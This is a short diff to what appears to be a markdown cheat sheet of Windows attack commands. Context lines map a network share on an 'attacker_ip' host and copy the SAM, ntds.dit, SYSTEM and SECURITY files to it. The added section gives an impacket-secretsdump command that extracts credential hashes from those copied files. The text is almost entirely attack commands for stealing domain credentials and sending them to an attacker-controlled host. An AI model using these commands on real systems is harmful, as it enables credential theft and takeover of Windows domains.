@@ -43,3 +43,7 @@ net use \\attacker_ip\share /user:0xmr
 # copy all files
 copy sam, ntds.dit, system, security \\attacker_ip\share 
 ```
+# Dump (DC sync)
+```language
+impacket-secretsdump -ntds ntds.dit -system system -sam sam -security security local
+```
